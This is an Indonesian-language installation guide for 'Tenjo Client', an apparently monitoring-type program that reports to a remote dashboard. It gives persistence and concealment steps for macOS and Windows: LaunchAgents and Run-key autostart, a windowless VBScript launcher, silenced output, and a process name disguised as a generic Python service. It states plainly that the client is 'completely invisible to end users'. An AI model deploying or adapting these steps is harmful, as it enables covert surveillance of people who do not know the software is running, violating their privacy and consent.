# Tenjo Client - Autostart Installation Guide

## 🕵️ Full Stealth Mode Features

Aplikasi Tenjo client telah dikonfigurasi untuk berjalan dalam **full stealth mode**:

### ✅ Fitur Stealth:
- ✅ **Tidak ada console window** - Berjalan di background tanpa jendela
- ✅ **Low priority process** - Nice level 10, tidak mengganggu performa
- ✅ **Minimal logging** - Hanya log ERROR saja (tidak ada WARNING/INFO)
- ✅ **Silent output** - Stdout/stderr ke /dev/null
- ✅ **Auto-restart** - Otomatis restart jika crash atau koneksi putus
- ✅ **Network aware** - Menunggu koneksi internet aktif sebelum start
- ✅ **Startup otomatis** - Berjalan otomatis saat login/restart

### 📋 Cara Install

#### macOS / Linux:
```bash
cd /path/to/Tenjo/client
./install_autostart.sh
```

Saat ditanya "Use production server instead? (y/N)":
- Ketik **y** untuk production server (`https://tenjo.adilabs.id`)
- Ketik **N** untuk local development (`http://127.0.0.1:8000`)

#### Windows:
```powershell
cd C:\path\to\Tenjo\client
powershell -ExecutionPolicy Bypass -File install_autostart.ps1
```

### 🔍 Verifikasi Installation

#### macOS:
```bash
# Check LaunchAgent status
launchctl list | grep tenjo

# Check if process running (should show Python process)
ps aux | grep python | grep -v grep

# View logs (minimal in stealth mode)
tail -f ~/Library/Application\ Support/Tenjo/logs/stealth.log
```

#### Windows:
```powershell
# Check if running
tasklist | findstr pythonw

# Check startup registry
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run | findstr Tenjo
```

### 🛡️ Stealth Mode Details

**macOS Configuration:**
- Process Type: Background (tidak muncul di Dock)
- Nice Level: 10 (low priority)
- Output: Redirected to /dev/null
- Log Level: ERROR only
- Auto-restart: Yes (network-aware)

**Windows Configuration:**
- Uses `pythonw.exe` (windowless Python)
- Runs with `/LOW` priority
- Starts with `/B /MIN` (background, minimized)
- Hidden from taskbar
- Silent VBScript launcher

### 🎮 Management Commands

#### Start/Stop (Admin only):

**macOS:**
```bash
# Start
launchctl start com.tenjo.client

# Stop
launchctl stop com.tenjo.client

# Restart
launchctl stop com.tenjo.client && launchctl start com.tenjo.client
```

**Windows:**
```powershell
# Start
wscript "C:\path\to\Tenjo\client\tenjo_client_silent.vbs"

# Stop
taskkill /F /IM pythonw.exe
```

### 🗑️ Uninstall

#### macOS / Linux:
```bash
cd /path/to/Tenjo/client
./uninstall_autostart.sh
```

#### Windows:
```powershell
cd C:\path\to\Tenjo\client
powershell -ExecutionPolicy Bypass -File uninstall_autostart.ps1
```

### 📊 Monitoring (Admin)

**Check if client is active:**
```bash
# macOS
ps aux | grep python | grep main

# Windows
tasklist | findstr pythonw
```

**Check server connection:**
- Buka dashboard: `http://127.0.0.1:8000` (local) atau `https://tenjo.adilabs.id` (production)
- Client akan muncul dengan status ONLINE (hijau) jika berhasil connect

### ⚠️ Important Notes

1. **User tidak akan melihat aplikasi berjalan** - Ini adalah stealth mode
2. **Tidak ada icon di taskbar/dock** - Process berjalan di background
3. **Low resource usage** - Priority rendah, tidak mengganggu aktivitas user
4. **Auto-recovery** - Jika crash atau disconnect, akan auto-restart dalam 60 detik
5. **Network-aware** - Menunggu koneksi internet sebelum mencoba connect ke server

### 🔒 Security Features

- Process name appears as generic Python service
- No visible UI or notifications
- Minimal disk writes (error logs only)
- Low network priority
- Silent operation

### 🚀 Production Deployment

Untuk deployment production:

1. Set server URL ke production:
   ```bash
   export TENJO_SERVER_URL=https://tenjo.adilabs.id
   ```

2. Run installer (akan detect environment variable):
   ```bash
   ./install_autostart.sh
   ```

3. Verify connection di dashboard production

### 📝 Troubleshooting

**Client tidak muncul di dashboard:**
1. Check process running: `ps aux | grep python`
2. Check logs: `tail -f ~/Library/Application\ Support/Tenjo/logs/stealth.log`
3. Verify server URL: Should be `https://tenjo.adilabs.id` for production
4. Check network connectivity

**Need to change server:**
1. Uninstall: `./uninstall_autostart.sh`
2. Set env var: `export TENJO_SERVER_URL=https://new-server.com`
3. Reinstall: `./install_autostart.sh`

---

**Status:** ✅ Ready for production deployment
**Mode:** 🕵️ Full Stealth - Completely invisible to end users
**Auto-start:** ✅ Enabled on login/restart
**Server:** https://tenjo.adilabs.id (production)
